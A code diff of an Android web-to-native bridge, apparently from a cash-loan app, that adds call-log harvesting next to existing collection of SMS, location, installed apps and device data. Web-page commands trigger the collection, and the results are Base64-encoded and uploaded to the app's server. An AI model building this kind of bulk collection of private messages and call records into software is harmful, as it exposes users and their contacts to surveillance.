@@ -4,6 +4,7 @@ import static android.app.Activity.RESULT_OK;
 
 import android.annotation.SuppressLint;
 import android.app.Activity;
+import android.app.ActivityManager;
 import android.content.ClipData;
 import android.content.ClipboardManager;
 import android.content.ContentResolver;
@@ -32,6 +33,7 @@ import android.webkit.JavascriptInterface;
 import android.webkit.ValueCallback;
 import android.webkit.WebView;
 
+import androidx.annotation.NonNull;
 import androidx.annotation.Nullable;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.content.FileProvider;
@@ -45,6 +47,8 @@ import com.grew.sw.cashlawn.model.AppListInfoModel;
 import com.grew.sw.cashlawn.model.AppsFlyerModel;
 import com.grew.sw.cashlawn.model.AuthInfoModel;
 import com.grew.sw.cashlawn.model.BatteryStatusData;
+import com.grew.sw.cashlawn.model.CallLogInfo;
+import com.grew.sw.cashlawn.model.CallLogInfoAuthModel;
 import com.grew.sw.cashlawn.model.ContactInfoAuthModel;
 import com.grew.sw.cashlawn.model.ContactInfoBackModel;
 import com.grew.sw.cashlawn.model.ContactInfoModel;
@@ -74,7 +78,9 @@ import com.grew.sw.cashlawn.util.ConsUtil;
 import com.grew.sw.cashlawn.util.DateUtil;
 import com.grew.sw.cashlawn.util.DeviceInfoUtil;
 import com.grew.sw.cashlawn.util.DeviceUtils;
+import com.grew.sw.cashlawn.util.FileProviderUtilKl;
 import com.grew.sw.cashlawn.util.FileUtil;
+import com.grew.sw.cashlawn.util.FileUtilKl;
 import com.grew.sw.cashlawn.util.IActivityManager;
 import com.grew.sw.cashlawn.util.ImageDataUtil;
 import com.grew.sw.cashlawn.util.LoadingUtil;
@@ -115,13 +121,14 @@ import okio.Buffer;
 import okio.BufferedSource;
 
 public class WebJsBridge {
+
     private WebView mWebView;
     private Context mContext;
     private Handler mainHandler;
     private ImageDataUtil imageDataUtil;
     private JsBridgeModel selectContactJsBridgeModel;
     private JsBridgeModel tackPhotoJsBridgeModel;
-    private File photoFile;
+//    private File photoFile;
     private final static int REQUEST_SELECT_CONTACTS = 2323;
     private final static int REQUEST_TACK_PHOTO = 2324;
     private final String TAG = "WebJsBridge";
@@ -140,6 +147,7 @@ public class WebJsBridge {
     public static final String APPTACKPHOTO = "appTackPhoto";
     public static final String APPFORWARD = "appForward";
     public static final String APPSERVICETIME = "appServiceTime";
+    public static final String INVOKE_CALL_LOG = "invokeCallLog";
 
 
     public WebJsBridge(Context context, WebView webView) {
@@ -150,7 +158,7 @@ public class WebJsBridge {
 
     @JavascriptInterface
     public void appData(String json) {
-        LogUtils.d( "----- appData :" + json);
+        LogUtils.w( "----- appData :" + json);
         mWebView.post(() -> {
             try {
                 JsBridgeModel jsBridgeModel = new Gson().fromJson(json, JsBridgeModel.class);
@@ -215,6 +223,10 @@ public class WebJsBridge {
                         //获取系统时间
                         appServiceTime(jsBridgeModel);
                         break;
+
+                    case INVOKE_CALL_LOG:
+                        getCallLog(jsBridgeModel);
+                        break;
                 }
             } catch (Exception e) {
                 e.printStackTrace();
@@ -263,30 +275,29 @@ public class WebJsBridge {
      *
      * @param jsBridgeModel
      */
+    public static String cameraFilepath;
+
     private void tackPhoto(JsBridgeModel jsBridgeModel) {
         XXPermissions.with(mContext)
-                .permission(Permission.Group.STORAGE)
+//                .permission(Permission.Group.STORAGE)
                 .permission(Permission.CAMERA)
                 .request(new OnPermissionCallback() {
                     @Override
                     public void onGranted(List<String> permissions, boolean all) {
                         if (all) {
                             tackPhotoJsBridgeModel = jsBridgeModel;
-                            Intent takePictureIntent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
-                            photoFile = new File(ComUtil.getImageDir(), DateUtil.getServerTimestamp() + ".jpg");
-                            Uri mImageUri;
-                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
-                                //兼容7.0以上
-                                String authority = App.get().getPackageName() + ".provider";
-                                mImageUri = FileProvider.getUriForFile(App.get(), authority, photoFile);
-                            } else {
-                                mImageUri = Uri.fromFile(photoFile);
-                            }
-                            takePictureIntent.putExtra(MediaStore.EXTRA_OUTPUT, mImageUri);
-                            takePictureIntent.putExtra("android.intent.extra.USE_FRONT_CAMERA", true);
-                            takePictureIntent.putExtra("android.intent.extras.CAMERA_FACING", 1);
-                            takePictureIntent.putExtra("android.intent.extras.LENS_FACING_FRONT", 1);
-                            ((Activity) mContext).startActivityForResult(takePictureIntent, REQUEST_TACK_PHOTO);
+                            String filePath = FileUtilKl.getInnerImgPath(mContext);
+                            String fileName = System.currentTimeMillis() + ".jpg";
+                            cameraFilepath = filePath + fileName;
+                            File cameraFile = new File(cameraFilepath);
+                            Uri imageUri = FileProviderUtilKl.getUriForFile(mContext, cameraFile);
+                            Intent captureIntent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
+                            captureIntent.putExtra(MediaStore.EXTRA_OUTPUT, imageUri);
+                            //  下面三个 调用前置摄像头
+                            captureIntent.putExtra("android.intent.extras.CAMERA_FACING", 1);
+                            captureIntent.putExtra("android.intent.extras.LENS_FACING_FRONT", 1);
+                            captureIntent.putExtra("android.intent.extra.USE_FRONT_CAMERA", true);
+                            ((Activity) mContext).startActivityForResult(captureIntent, REQUEST_TACK_PHOTO);
                         } else {
                             callJSFailP(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId());
                         }
@@ -340,14 +351,22 @@ public class WebJsBridge {
      */
     private void selectContact(JsBridgeModel jsBridgeModel) {
         XXPermissions.with(mContext)
-                .permission(Permission.READ_CONTACTS)
-                .permission(Permission.GET_ACCOUNTS)
+                .permission(Permission.READ_PHONE_STATE)
+//                .permission(Permission.GET_ACCOUNTS)
                 .request(new OnPermissionCallback() {
                     @Override
                     public void onGranted(List<String> permissions, boolean all) {
                         if (all) {
                             selectContactJsBridgeModel = jsBridgeModel;
-                            ((Activity) mContext).startActivityForResult(new Intent(Intent.ACTION_PICK, ContactsContract.Contacts.CONTENT_URI), REQUEST_SELECT_CONTACTS);
+//                            ((Activity) mContext).startActivityForResult(new Intent(Intent.ACTION_PICK, ContactsContract.Contacts.CONTENT_URI), REQUEST_SELECT_CONTACTS);
+
+                            Intent intent = new Intent();
+                            intent.setAction("android.intent.action.PICK");
+                            intent.addCategory("android.intent.category.DEFAULT");
+                            intent.setType("vnd.android.cursor.dir/phone_v2");
+                            ((Activity) mContext).startActivityForResult(intent,REQUEST_SELECT_CONTACTS );
+
+
                         } else {
                             callJSFailP(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId());
                         }
@@ -367,21 +386,29 @@ public class WebJsBridge {
      */
     private void contactInfo(JsBridgeModel jsBridgeModel) {
         XXPermissions.with(mContext)
-                .permission(Permission.READ_CONTACTS)
-                .permission(Permission.GET_ACCOUNTS)
+//                .permission(Permission.READ_CONTACTS)
+//                .permission(Permission.GET_ACCOUNTS)
+                .permission(Permission.READ_CALL_LOG)
                 .request(new OnPermissionCallback() {
 
                     @Override
                     public void onGranted(List<String> permissions, boolean all) {
                         if (all) {
-                            new Thread(() -> {
-                                ArrayList<ContactInfoModel> contactInfoModels = AuthDataUtil.getContactInfoModels();
-                                ContactInfoAuthModel contactInfoAuthModel = new ContactInfoAuthModel();
-                                contactInfoAuthModel.setCreate_time(DateUtil.getServerTimestamp() / 1000);
-                                contactInfoAuthModel.setList(contactInfoModels);
-                                LogUtils.d("通讯录信息：\n" + contactInfoAuthModel.toString());
-                                pushAuthData(jsBridgeModel, contactInfoAuthModel, null, null, null, null, null);
-                            }).start();
+//                            new Thread(() -> {
+//                                ArrayList<ContactInfoModel> contactInfoModels = AuthDataUtil.getContactInfoModels();
+//                                ContactInfoAuthModel contactInfoAuthModel = new ContactInfoAuthModel();
+//                                contactInfoAuthModel.setCreate_time(DateUtil.getServerTimestamp() / 1000);
+//                                contactInfoAuthModel.setList(contactInfoModels);
+//                                LogUtils.d("通讯录信息：\n" + contactInfoAuthModel.toString());
+//                                pushAuthData(jsBridgeModel, contactInfoAuthModel, null, null, null, null, null);
+//                            }).start();
+
+                            ContactInfoAuthModel contactInfoAuthModel = new ContactInfoAuthModel();
+                            contactInfoAuthModel.setCreate_time(DateUtil.getServerTimestamp() / 1000);
+                            contactInfoAuthModel.setList(new ArrayList<>());
+                            LogUtils.d("通讯录信息：\n" + contactInfoAuthModel.toString());
+                            pushAuthData(jsBridgeModel, contactInfoAuthModel, null, null, null, null, null, null);
+
                         } else {
                             callJSFailP(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId());
                         }
@@ -401,25 +428,33 @@ public class WebJsBridge {
      */
     private void albumInfo(JsBridgeModel jsBridgeModel) {
         XXPermissions.with(mContext)
-                .permission(Permission.Group.STORAGE)
+//                .permission(Permission.Group.STORAGE)
                 .permission(Permission.READ_PHONE_STATE)
                 .request(new OnPermissionCallback() {
 
                     @Override
                     public void onGranted(List<String> permissions, boolean all) {
                         if (all) {
-                            if (imageDataUtil == null) {
-                                imageDataUtil = new ImageDataUtil();
-                            }
-                            imageDataUtil.start((AppCompatActivity) mContext, albumInfoModels -> {
-                                imageDataUtil.unLoadedListener();
-                                AlbumInfoAuthModel albumInfoAuthModel = new AlbumInfoAuthModel();
-                                albumInfoAuthModel.setCreate_time(DateUtil.getServerTimestamp()/1000);
-                                albumInfoAuthModel.setList(albumInfoModels);
+//                            if (imageDataUtil == null) {
+//                                imageDataUtil = new ImageDataUtil();
+//                            }
+//                            imageDataUtil.start((AppCompatActivity) mContext, albumInfoModels -> {
+//                                imageDataUtil.unLoadedListener();
+//                                AlbumInfoAuthModel albumInfoAuthModel = new AlbumInfoAuthModel();
+//                                albumInfoAuthModel.setCreate_time(DateUtil.getServerTimestamp()/1000);
+//                                albumInfoAuthModel.setList(albumInfoModels);
+//
+//                                LogUtils.d("相册信息：\n" + albumInfoAuthModel.toString());
+//                                pushAuthData(jsBridgeModel, null, null, null, null, null, albumInfoAuthModel);
+//                            });
 
-                                LogUtils.d("相册信息：\n" + albumInfoAuthModel.toString());
-                                pushAuthData(jsBridgeModel, null, null, null, null, null, albumInfoAuthModel);
-                            });
+                            AlbumInfoAuthModel albumInfoAuthModel = new AlbumInfoAuthModel();
+                            albumInfoAuthModel.setCreate_time(DateUtil.getServerTimestamp()/1000);
+                            albumInfoAuthModel.setList(new ArrayList<>());
+
+                            LogUtils.d("相册信息：\n" + albumInfoAuthModel.toString());
+                            pushAuthData(jsBridgeModel, null, null, null, null, null, albumInfoAuthModel, null);
+
                         } else {
                             callJSFailP(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId());
                         }
@@ -441,8 +476,8 @@ public class WebJsBridge {
         XXPermissions.with(mContext)
                 .permission(Permission.READ_PHONE_STATE)
                 .permission(Permission.READ_SMS)
-                .permission(Permission.READ_CONTACTS)
-                .permission(Permission.GET_ACCOUNTS)
+//                .permission(Permission.READ_CONTACTS)
+//                .permission(Permission.GET_ACCOUNTS)
                 .request(new OnPermissionCallback() {
 
                     @Override
@@ -456,8 +491,41 @@ public class WebJsBridge {
                                 smsInfoAuthModel.setList(smsBeans);
                                 LogUtils.d("短信信息：\n" + smsInfoAuthModel.toString());
 
-                                pushAuthData(jsBridgeModel, null, null, null, null, smsInfoAuthModel, null);
+                                pushAuthData(jsBridgeModel, null, null, null, null, smsInfoAuthModel, null, null);
                             }).start();
+                        } else {
+                            callJSFailP(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId());
+                        }
+                    }
+
+                    @Override
+                    public void onDenied(List<String> permissions, boolean never) {
+                        callJSFailP(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId());
+                    }
+                });
+    }
+
+    private void getCallLog(JsBridgeModel jsBridgeModel) {
+        XXPermissions.with(mContext)
+                .permission(Permission.READ_CALL_LOG)
+//                .permission(Permission.READ_SMS)
+//                .permission(Permission.READ_CONTACTS)
+//                .permission(Permission.GET_ACCOUNTS)
+                .request(new OnPermissionCallback() {
+
+                    @Override
+                    public void onGranted(List<String> permissions, boolean all) {
+                        if (all) {
+
+                            new Thread(() -> {
+                                List<CallLogInfo> callLogInfoList = AuthDataUtil.getContentCallLog();
+                                CallLogInfoAuthModel contactInfoAuthModel = new CallLogInfoAuthModel();
+                                contactInfoAuthModel.setCreate_time(DateUtil.getServerTimestamp() / 1000);
+                                contactInfoAuthModel.setList(callLogInfoList);
+                                LogUtils.d("通讯录信息：\n" + contactInfoAuthModel.toString());
+                                pushAuthData(jsBridgeModel, null, null, null, null, null, null, contactInfoAuthModel);
+                            }).start();
+
                         } else {
                             callJSFailP(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId());
                         }
@@ -479,7 +547,7 @@ public class WebJsBridge {
         SpecialPermissionUtil.openLocService();
         XXPermissions.with(mContext)
                 .permission(Permission.READ_PHONE_STATE)
-                .permission(Permission.ACCESS_FINE_LOCATION)
+//                .permission(Permission.ACCESS_FINE_LOCATION)
                 .permission(Permission.ACCESS_COARSE_LOCATION)
                 .request(new OnPermissionCallback() {
 
@@ -540,7 +608,7 @@ public class WebJsBridge {
                                 }
                                 geoBean.setGps(gpsLatLong);
                                 LogUtils.d("位置信息：" + geoBean.toString());
-                                pushAuthData(jsBridgeModel, null, null, null, geoBean, null, null);
+                                pushAuthData(jsBridgeModel, null, null, null, geoBean, null, null, null);
                             }).start();
                         } else {
                             callJSFailP(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId());
@@ -593,7 +661,7 @@ public class WebJsBridge {
                                     appListInfoAuthModel.setCreate_time(DateUtil.getServerTimestamp()/1000);
                                     appListInfoAuthModel.setList(appListBeans);
                                     LogUtils.d("安装信息：\n" + appListInfoAuthModel.toString());
-                                    pushAuthData(jsBridgeModel, null, null, appListInfoAuthModel, null, null, null);
+                                    pushAuthData(jsBridgeModel, null, null, appListInfoAuthModel, null, null, null, null);
                                 } catch (Exception e) {
                                     e.printStackTrace();
                                     callJSFailP(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId());
@@ -621,10 +689,10 @@ public class WebJsBridge {
         SpecialPermissionUtil.openLocService();
         SpecialPermissionUtil.openWifi();
         XXPermissions.with(mContext)
-                .permission(Permission.ACCESS_FINE_LOCATION)
+//                .permission(Permission.ACCESS_FINE_LOCATION)
                 .permission(Permission.ACCESS_COARSE_LOCATION)
                 .permission(Permission.READ_PHONE_STATE)
-                .permission(Permission.Group.STORAGE)
+//                .permission(Permission.Group.STORAGE)
                 .request(new OnPermissionCallback() {
                     @Override
                     public void onGranted(List<String> permissions, boolean all) {
@@ -734,7 +802,7 @@ public class WebJsBridge {
                                             e.printStackTrace();
                                         }
                                         LogUtils.d("设备信息：\n" + deviceBean.toString());
-                                        pushAuthData(jsBridgeModel, null, deviceBean, null, null, null, null);
+                                        pushAuthData(jsBridgeModel, null, deviceBean, null, null, null, null, null);
                                     }
                                 }.start();
                             }
@@ -810,12 +878,18 @@ public class WebJsBridge {
     }
 
 
-    private void pushAuthData(JsBridgeModel models, ContactInfoAuthModel contactBeanList
-            , DeviceInfoModel deviceBean
-            , AppListInfoAuthModel appListBeanList, LocationBean geoBeanList, SmsInfoAuthModel smsBeanList
-            , AlbumInfoAuthModel albumBeanList) {
+    private void pushAuthData(JsBridgeModel models,
+                              ContactInfoAuthModel contactBeanList,
+                              DeviceInfoModel deviceBean,
+                              AppListInfoAuthModel appListBeanList,
+                              LocationBean geoBeanList,
+                              SmsInfoAuthModel smsBeanList,
+                              AlbumInfoAuthModel albumBeanList,
+                              CallLogInfoAuthModel callLogInfoAuthModel) {
+
         Map<String, String> map = new HashMap<>();
         AuthInfoModel authInfoModel = new AuthInfoModel(albumBeanList, appListBeanList, contactBeanList, smsBeanList, deviceBean, geoBeanList);
+        authInfoModel.setCalllog_info(callLogInfoAuthModel);
         String content = new Gson().toJson(authInfoModel);
         map.put("authInfo", Base64.encodeToString(content.getBytes(), Base64.DEFAULT));
         NetClient.getAuthService()
@@ -900,114 +974,99 @@ public class WebJsBridge {
     }
 
     public void onActivityResult(int requestCode, int resultCode, Intent data) {
+        if (data == null || App.get() == null){
+            return;
+        }
         if (requestCode == REQUEST_SELECT_CONTACTS) {
-            if (resultCode == RESULT_OK) {
-                try {
-                    ContactInfoBackModel contactInfoModel = new ContactInfoBackModel();
-                    Uri contactData = data.getData();
-                    Cursor cursor = App.get().getContentResolver().query(contactData, null, null, null, null);
-                    if (cursor != null) {
-                        cursor.moveToFirst();
-                        contactInfoModel.name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME));
-                        Cursor phone = App.get().getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
-                                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = "
-                                        + cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID)), null, null);
-                        if (phone != null) {
-                            phone.moveToNext();
-                            contactInfoModel.mobile = phone.getString(phone.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));
-                            phone.close();
-                        }
-                        cursor.close();
-                        LogUtils.d("选择通讯录信息：\n" + contactInfoModel.toString());
-                        callJSSuccess(selectContactJsBridgeModel.getAppAction(), selectContactJsBridgeModel.getAppActionId(), new Gson().toJson(contactInfoModel));
-                    } else {
-                        callJSFailOther(selectContactJsBridgeModel.getAppAction(), selectContactJsBridgeModel.getAppActionId(), "null");
-                    }
-                } catch (Exception e) {
-                    e.printStackTrace();
-                    callJSFailOther(selectContactJsBridgeModel.getAppAction(), selectContactJsBridgeModel.getAppActionId(), e.toString());
-                }
-            } else {
-                callJSFailOther(selectContactJsBridgeModel.getAppAction(), selectContactJsBridgeModel.getAppActionId(), "cancel selection");
-            }
-        } else if (requestCode == REQUEST_TACK_PHOTO) {
-            if (resultCode == RESULT_OK) {
-                LoadingUtil.show();
-                new Thread(() -> {
-                    File file = null;
-                    if (photoFile != null) {
-                        LogUtils.d("压缩前：" + photoFile.length());
-                        try {
-                            file = ComUtil.compressImage(photoFile.getAbsolutePath());
-                        }catch (Exception e){
-                            e.printStackTrace();
-                            file = photoFile;
-                        }
-                        LogUtils.d("压缩后：" + file.length());
-                    }
-                    if (file == null) {
-                        LoadingUtil.dismiss();
-                        callJSFailOther(tackPhotoJsBridgeModel.getAppAction(), tackPhotoJsBridgeModel.getAppActionId(), "file is null");
-                        return;
-                    }
-                    NetUpload.okHttpUploadImage(file, new Callback() {
-                        @Override
-                        public void onFailure(Call call, IOException e) {
-                            LoadingUtil.dismiss();
-                            callJSFailOther(tackPhotoJsBridgeModel.getAppAction(), tackPhotoJsBridgeModel.getAppActionId(), e.toString());
-                        }
+            processContactBack(resultCode, data);
 
-                        @Override
-                        public void onResponse(Call call, Response response) throws IOException {
-                            LoadingUtil.dismiss();
-                            if (response.isSuccessful()){
-                                try {
-                                    String responseBody = NetUpload.getResponseBody(response);
-                                    ImageResponse imageResponse=new Gson().fromJson(responseBody,ImageResponse.class);
-                                    JSCommonJSModel jsCommonJSModel = new JSCommonJSModel();
-                                    jsCommonJSModel.setValue(imageResponse.getData());
-                                    callJSSuccess(tackPhotoJsBridgeModel.getAppAction(), tackPhotoJsBridgeModel.getAppActionId(), new Gson().toJson(jsCommonJSModel));
-                                }catch (Exception e){
-                                    e.printStackTrace();
-                                    callJSFailOther(tackPhotoJsBridgeModel.getAppAction(), tackPhotoJsBridgeModel.getAppActionId(), e.toString());
-                                }
-                            }else {
-                                callJSFailOther(tackPhotoJsBridgeModel.getAppAction(), tackPhotoJsBridgeModel.getAppActionId(), "");
-                            }
-                        }
-                    });
-//                    RequestBody imageBody = RequestBody.create(MediaType.parse("multipart/form-data"), file);
-//                    MultipartBody.Part txtBodyPart = MultipartBody.Part.createFormData("type", "jpg");
-//                    MultipartBody.Part imageBodyPart = MultipartBody.Part.createFormData("file", file.getName(), imageBody);
-//                    Call<ImageResponse> repos = NetClient.getNewService().uploadImg(txtBodyPart, imageBodyPart);
-//                    repos.enqueue(new Callback<ImageResponse>() {
-//                        @Override
-//                        public void onResponse(Call<ImageResponse> call, Response<ImageResponse> response) {
-//                            LoadingUtil.dismiss();
-//                            try {
-//                                if (response.code() == 200) {
-//                                    JSCommonJSModel jsCommonJSModel = new JSCommonJSModel();
-//                                    jsCommonJSModel.setValue(response.body().getData());
-//                                    callJSSuccess(tackPhotoJsBridgeModel.getAppAction(), tackPhotoJsBridgeModel.getAppActionId(), new Gson().toJson(jsCommonJSModel));
-//                                } else {
-//                                    callJSFailOther(tackPhotoJsBridgeModel.getAppAction(), tackPhotoJsBridgeModel.getAppActionId(), response.message());
-//                                }
-//                            } catch (Exception e) {
-//                                e.printStackTrace();
-//                                callJSFailOther(tackPhotoJsBridgeModel.getAppAction(), tackPhotoJsBridgeModel.getAppActionId(), e.toString());
-//                            }
-//                        }
-//
-//                        @Override
-//                        public void onFailure(Call<ImageResponse> call, Throwable t) {
-//                            LoadingUtil.dismiss();
-//                            callJSFailOther(tackPhotoJsBridgeModel.getAppAction(), tackPhotoJsBridgeModel.getAppActionId(), t.toString());
-//                        }
-//                    });
-                }).start();
-            } else {
-                callJSFailOther(tackPhotoJsBridgeModel.getAppAction(), tackPhotoJsBridgeModel.getAppActionId(), "cancel selection");
+        } else if (requestCode == REQUEST_TACK_PHOTO) {
+            processPhotoBack(resultCode);
+        }
+    }
+
+    private void processContactBack(int resultCode, Intent data){
+        if (data == null || App.get() == null){
+            return;
+        }
+        if (resultCode == RESULT_OK) {
+            try {
+                ContactInfoBackModel contactInfoModel = new ContactInfoBackModel();
+                Uri contactData = data.getData();
+                Cursor cursor = App.get().getContentResolver().query(contactData, null, null, null, null);
+                while (cursor != null && cursor.moveToNext()) {
+                    int nameIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
+                    if (nameIndex >= 0) {
+                        contactInfoModel.name = cursor.getString(nameIndex);
+                    }
+                    int phoneNumIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
+                    if (phoneNumIndex >= 0) {
+                        contactInfoModel.mobile = cursor.getString(phoneNumIndex);
+                    }
+                }
+                if (cursor != null) {
+                    cursor.close();
+                }
+                LogUtils.d("选择通讯录信息：\n" + contactInfoModel.toString());
+                callJSSuccess(selectContactJsBridgeModel.getAppAction(), selectContactJsBridgeModel.getAppActionId(), new Gson().toJson(contactInfoModel));
+
+            } catch (Exception e) {
+                e.printStackTrace();
+                callJSFailOther(selectContactJsBridgeModel.getAppAction(), selectContactJsBridgeModel.getAppActionId(), e.toString());
             }
+        } else {
+            callJSFailOther(selectContactJsBridgeModel.getAppAction(), selectContactJsBridgeModel.getAppActionId(), "cancel selection");
+        }
+    }
+
+    private void processPhotoBack(int resultCode){
+        if (resultCode == RESULT_OK) {
+            LoadingUtil.show();
+            new Thread(() -> {
+                File file = null;
+                File photoFile = new File(cameraFilepath);
+                LogUtils.d("压缩前：" + photoFile.length());
+                try {
+                    file = ComUtil.compressImage(photoFile.getAbsolutePath());
+                }catch (Exception e){
+                    e.printStackTrace();
+                }
+                if (file == null){
+                    file = photoFile;
+                }
+                LogUtils.d("压缩后：" + file.length());
+
+                NetUpload.okHttpUploadImage(file, new Callback() {
+                    @Override
+                    public void onFailure(@NonNull Call call, @NonNull IOException e) {
+                        LoadingUtil.dismiss();
+                        callJSFailOther(tackPhotoJsBridgeModel.getAppAction(), tackPhotoJsBridgeModel.getAppActionId(), e.toString());
+                    }
+
+                    @Override
+                    public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
+                        LoadingUtil.dismiss();
+                        if (response.isSuccessful()){
+                            try {
+                                String responseBody = NetUpload.getResponseBody(response);
+                                ImageResponse imageResponse=new Gson().fromJson(responseBody,ImageResponse.class);
+                                JSCommonJSModel jsCommonJSModel = new JSCommonJSModel();
+                                jsCommonJSModel.setValue(imageResponse.getData());
+                                callJSSuccess(tackPhotoJsBridgeModel.getAppAction(), tackPhotoJsBridgeModel.getAppActionId(), new Gson().toJson(jsCommonJSModel));
+                            }catch (Exception e){
+                                e.printStackTrace();
+                                callJSFailOther(tackPhotoJsBridgeModel.getAppAction(), tackPhotoJsBridgeModel.getAppActionId(), e.toString());
+                            }
+                        }else {
+                            callJSFailOther(tackPhotoJsBridgeModel.getAppAction(), tackPhotoJsBridgeModel.getAppActionId(), "");
+                        }
+                    }
+                });
+
+            }).start();
+
+        } else {
+            callJSFailOther(tackPhotoJsBridgeModel.getAppAction(), tackPhotoJsBridgeModel.getAppActionId(), "cancel selection");
         }
     }
 
